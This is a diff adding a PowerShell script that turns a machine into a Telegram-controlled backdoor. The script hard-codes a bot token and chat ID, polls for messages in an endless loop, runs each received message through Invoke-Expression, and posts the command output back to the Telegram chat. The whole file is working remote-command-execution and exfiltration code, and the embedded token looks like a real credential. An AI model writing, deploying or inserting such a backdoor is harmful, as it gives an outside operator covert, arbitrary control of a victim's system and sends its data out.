@@ -1,0 +1,50 @@
+# Install-Module -Name PoshGram -Scope CurrentUser
+Import-Module PoshGram
+
+$BOT_TOKEN = "8273212830:AAHdcO2H9nH_HHkwV0rVprnClLsUo56ZPYE"
+$CHAT_ID = "5681247685"
+
+function Execute-Command {
+    param (
+        [string]$Command
+    )
+    try {
+        $output = Invoke-Expression $Command 2>&1 | Out-String
+        return $output
+    }
+    catch {
+        return "Error executing command: $_"
+    }
+}
+
+function Send-TelegramMessage {
+    param (
+        [string]$Message
+    )
+    try {
+        Send-TelegramTextMessage -BotToken $BOT_TOKEN -ChatId $CHAT_ID -Message $Message
+    }
+    catch {
+        Write-Error "Failed to send Telegram message: $_"
+    }
+}
+
+while ($true) {
+    try {
+        $updates = Get-TelegramUpdate -BotToken $BOT_TOKEN
+        foreach ($update in $updates.result) {
+            if ($update.message -and $update.message.chat.id -eq $CHAT_ID) {
+                $command = $update.message.text
+                $message_id = $update.message.message_id
+                $output = Execute-Command -Command $command
+                Send-TelegramMessage -Message "Command: $command`nOutput:`n$output"
+                $offset = $update.update_id + 1
+                Update-TelegramOffset -BotToken $BOT_TOKEN -Offset $offset
+            }
+        }
+    }
+    catch {
+        Write-Error "Error in main loop: $_"
+    }
+    Start-Sleep -Seconds 2
+}
